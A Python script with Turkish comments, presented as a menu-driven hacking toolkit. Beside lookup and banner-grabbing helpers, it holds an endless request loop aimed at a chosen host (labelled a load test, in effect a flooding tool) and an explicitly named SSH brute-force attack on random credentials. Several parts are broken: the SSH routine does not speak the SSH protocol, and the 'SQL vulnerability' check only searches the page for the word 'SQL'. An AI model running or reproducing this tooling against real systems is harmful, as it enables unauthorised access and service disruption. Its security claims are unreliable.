import os
import time
import socket
import requests
import http.client
import random
import string

# Rastgele kullanıcı adı ve şifre üretme fonksiyonu
def rastgele_dize_olustur(uzunluk):
    karakterler = string.ascii_letters + string.digits
    return ''.join(random.choice(karakterler) for _ in range(uzunluk))

# İnternete bağlı cihazları gör
def internet_baglantili_cihazlari_gor():
    try:
        os.system("arp -a")
    except Exception as e:
        print(f"Bağlantı hatası: {e}")

# Site IP adresi tarat
def site_ip_adresi_tarat():
    try:
        site = input("Site adresini girin (örn: google.com): ")
        ip = socket.gethostbyname(site)
        print(f"{site} için IP adresi: {ip}")
    except socket.gaierror as e:
        print(f"IP adresi alınırken hata oluştu: {e}")

# Site yük testi yap
def site_yuk_testi_yap(ip, port):
    try:
        while True:
            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            conn.connect((ip, int(port)))
            mesaj = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(ip)
            conn.send(mesaj.encode())
            conn.close()
            time.sleep(0.1)
            print(f"{ip}:{port} adresine veri paketi gönderildi.")
    except Exception as e:
        print(f"Bağlantı hatası: {e}")

# Site güvenlik açığı tespit et
def site_guvenlik_acigi_tespit_et(ip, port):
    try:
        url = f"http://{ip}:{port}/"
        response = requests.get(url)
        if "SQL" in response.text:
            print(f"{ip}:{port} sitesinde potansiyel SQL güvenlik açığı tespit edildi!")
        else:
            print(f"{ip}:{port} sitesinde bilinen bir güvenlik açığı tespit edilmedi.")
    except requests.exceptions.RequestException as e:
        print(f"Bağlantı hatası: {e}")

# Site GEO-IP bilgisine ulaş
def site_geo_ip_bilgisine_ulas(ip):
    try:
        conn = http.client.HTTPConnection("ip-api.com")
        conn.request("GET", f"/json/{ip}")
        response = conn.getresponse()
        data = response.read().decode('utf-8')
        print(data)
    except Exception as e:
        print(f"Bağlantı hatası: {e}")

# Site Server Version öğren
def site_server_version_ogren(ip, port):
    try:
        conn = http.client.HTTPConnection(ip, int(port))
        conn.request("HEAD", "/")
        response = conn.getresponse()
        print(f"Sunucu versiyonu: {response.getheader('Server')}")
    except Exception as e:
        print(f"Bağlantı hatası: {e}")

# Site HTML görüntüleme
def site_html_goruntule():
    try:
        site = input("Site adresini girin (örn: google.com): ")
        ip = socket.gethostbyname(site)
        conn = http.client.HTTPConnection(ip, 80)
        conn.request("GET", "/")
        response = conn.getresponse()
        html = response.read().decode('utf-8')
        print(f"HTML İçeriği:\n{html}")
    except Exception as e:
        print(f"Bağlantı hatası: {e}")

# SSH Brute-Force Saldırısı
def ssh_brute_force_saldirisi(ip, port):
    print(f"{ip}:{port} için SSH brute-force saldırısı başlatılıyor...")
    kullanici_adı_uzunlugu = int(input("Oluşturulacak kullanıcı adlarının uzunluğunu girin: "))
    sifre_uzunlugu = int(input("Oluşturulacak şifrelerin uzunluğunu girin: "))

    max_deneme = 1000
    for _ in range(max_deneme):
        kullanici_adı = rastgele_dize_olustur(kullanici_adı_uzunlugu)
        sifre = rastgele_dize_olustur(sifre_uzunlugu)
        print(f"Denenen kullanıcı adı: {kullanici_adı} ve şifre: {sifre}")

        try:
            ssh_soketi = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ssh_soketi.connect((ip, int(port)))
            ssh_soketi.send(f"SSH-2.0-OpenSSH_7.6\r\n".encode('utf-8'))

            veri = ssh_soketi.recv(1024).decode('utf-8')
            if "SSH" in veri:
                ssh_soketi.send(f"{kullanici_adı}\r\n".encode('utf-8'))
                ssh_soketi.send(f"{sifre}\r\n".encode('utf-8'))

                cevap = ssh_soketi.recv(1024).decode('utf-8')
                if "Permission denied" not in cevap:
                    print(f"Başarılı! Kullanıcı adı: {kullanici_adı}, Şifre: {sifre}")
                    return
                else:
                    print(f"Başarısız: Kullanıcı adı: {kullanici_adı}, Şifre: {sifre}")
            ssh_soketi.close()
        except Exception as e:
            print(f"Bağlantı hatası: {e}")
            ssh_soketi.close()

    print("Brute-force saldırısı tamamlandı.")

# Yeni özellikler
def sunucu_bilgilerini_gor(ip, port):
    print(f"{ip}:{port} sunucusu için bilgi alınıyor...")
    try:
        conn = http.client.HTTPConnection(ip, int(port))
        conn.request("HEAD", "/")
        response = conn.getresponse()
        headers = response.getheaders()
        for header in headers:
            print(f"{header[0]}: {header[1]}")
    except Exception as e:
        print(f"Sunucu bilgileri alınırken hata: {e}")

def dns_kayitlarini_gor(site):
    try:
        ipler = socket.gethostbyname_ex(site)
        print(f"{site} için DNS kayıtları:")
        for ip in ipler[2]:
            print(ip)
    except Exception as e:
        print(f"DNS kayıtları alınırken hata: {e}")

def main():
    gizli_anahtar = "your_secret_key"
    kullanici_anahtari = input("Gizli anahtarınızı girin: ")

    if kullanici_anahtari != gizli_anahtar:
        print("Geçersiz anahtar! Erişim reddedildi.")
        return

    while True:
        print("""
        1- İnternete Bağlı Cihazları Gör
        2- Site IP Adresi Tarat
        3- Site Yük Testi Yap
        4- Site Güvenlik Açığı Tespit Et
        5- Site GEO-IP Bilgisine Ulaş
        6- Site Server Version Öğren
        7- Site HTML Görüntüleme
        8- SSH Brute-Force Saldırısı Yap
        9- Sunucu Bilgilerini Gör
        10- DNS Kayıtlarını Gör
        """)
        secim = input("Bir seçenek girin (1-10): ")

        if secim == "1":
            internet_baglantili_cihazlari_gor()
        elif secim == "2":
            site_ip_adresi_tarat()
        elif secim == "7":
            site_html_goruntule()
        else:
            ip = input("IP adresini girin: ")
            port = input("Port numarasını girin: ")
            if secim == "3":
                site_yuk_testi_yap(ip, port)
            elif secim == "4":
                site_guvenlik_acigi_tespit_et(ip, port)
            elif secim == "5":
                site_geo_ip_bilgisine_ulas(ip)
            elif secim == "6":
                site_server_version_ogren(ip, port)
            elif secim == "8":
                ssh_brute_force_saldirisi(ip, port)
            elif secim == "9":
                sunucu_bilgilerini_gor(ip, port)
            elif secim == "10":
                dns_kayitlarini_gor(ip)
            else:
                print("Geçersiz seçim, lütfen tekrar seçin.")

        devam = input("Başka bir işlem yapmak ister misiniz? (evet/hayır): ")
        if devam.lower() != 'evet':
            break

if __name__ == "__main__":
    main() 
